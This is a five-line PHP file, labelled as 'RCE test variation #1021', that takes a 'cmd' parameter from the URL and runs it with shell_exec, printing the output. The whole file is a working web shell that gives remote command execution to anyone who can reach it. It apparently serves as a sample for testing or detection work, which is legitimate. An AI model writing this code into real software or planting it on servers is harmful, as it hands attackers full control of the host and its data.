<?php
// RCE test variation #1021
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>